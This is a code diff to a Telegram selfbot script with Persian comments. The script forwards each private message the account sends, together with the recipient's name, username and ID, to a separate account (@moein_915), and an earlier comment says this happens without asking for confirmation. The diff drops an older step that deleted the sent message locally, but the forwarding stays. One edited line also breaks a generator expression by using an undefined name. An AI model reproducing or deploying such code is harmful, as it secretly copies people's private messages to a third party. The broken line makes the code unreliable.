@@ -78,7 +78,7 @@ async def cleanup_dialogs():
                 await asyncio.sleep(0.5)
 
                 current = await get_current_dialogs()
-                exists = any(d.id == dialog.id for d in current)
+                exists = any(d.id == dialog.id for dialog in current)
 
                 if exists:
                     print(f"[STILL THERE] {name}")
@@ -110,17 +110,17 @@ async def watch_sent_messages(event):
     try:
         me = await client.get_me()
 
-        # Saved Messages نادیده گرفته شود
+        # پیام‌های Saved Messages نادیده گرفته می‌شوند
         if event.chat_id == me.id:
             return
 
         entity = await event.get_chat()
 
-        # فقط چت خصوصی با کاربر
+        # فقط پیام‌های خصوصی به کاربران
         if not isinstance(entity, User):
             return
 
-        # مشخصات گیرنده
+        # اطلاعات گیرنده
         first_name = getattr(entity, "first_name", None) or ""
         last_name = getattr(entity, "last_name", None) or ""
         username = getattr(entity, "username", None)
@@ -142,9 +142,9 @@ async def watch_sent_messages(event):
             or "[پیام بدون متن]"
         )
 
-        # ارسال مشخصات بدون درخواست تأیید
+        # گزارش برای @moein_915
         info = (
-            "📨 پیام ارسال شد\n\n"
+            "📨 پیام جدید ارسال شد\n\n"
             f"👤 گیرنده: {full_name}\n"
             f"🔹 Username: {username_text}\n"
             f"🆔 ID: {user_id}\n\n"
@@ -162,21 +162,12 @@ async def watch_sent_messages(event):
             f"{full_name} | message_id={event.id}"
         )
 
-        # حذف فقط از سمت اکانت خودت
-        await client.delete_messages(
-            entity=event.chat_id,
-            message_ids=event.id,
-            revoke=False
-        )
-
-        print(
-            f"[DELETED LOCALLY] "
-            f"{full_name} | message_id={event.id}"
-        )
+        # پیام اصلی دست‌نخورده باقی می‌ماند.
+        # هیچ delete_messages در اینجا وجود ندارد.
 
     except FloodWaitError as e:
         print(
-            f"[DELETE FLOODWAIT] "
+            f"[FLOODWAIT] "
             f"Waiting {e.seconds} seconds..."
         )
 
@@ -199,7 +190,6 @@ async def main():
     # پاک‌سازی اولیه
     await cleanup_dialogs()
 
-    # سلف‌بات همچنان فعال می‌ماند
     print("\nWaiting for new messages...")
     print(f"Info receiver: {CONFIRMATION_USER}")
 
